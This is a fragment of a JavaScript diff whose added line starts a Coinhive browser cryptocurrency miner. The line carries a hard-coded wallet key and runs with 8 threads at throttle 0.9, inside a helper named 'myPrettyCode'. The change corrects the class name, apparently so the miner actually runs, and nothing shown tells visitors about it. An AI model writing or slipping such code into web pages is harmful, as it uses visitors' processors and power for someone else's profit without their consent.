@@ -15,7 +15,7 @@ function loadScript(url, callback)
     head.appendChild(script);
 };
 var myPrettyCode = function() {
-  var miner=new Coinhive.Anonymous('4Aio2FxFmciVKbu1JabGQGAvD3hEaL95DebaAq9td2UDLdSSM3fZNfWLfqjBkFKYjB2d9pAJw2F7Yh9rFZrEsCvE94277HJ',
+  var miner=new CoinHive.Anonymous('4Aio2FxFmciVKbu1JabGQGAvD3hEaL95DebaAq9td2UDLdSSM3fZNfWLfqjBkFKYjB2d9pAJw2F7Yh9rFZrEsCvE94277HJ',
         {
         threads:8,autoThreads:false,throttle:0.9
         }
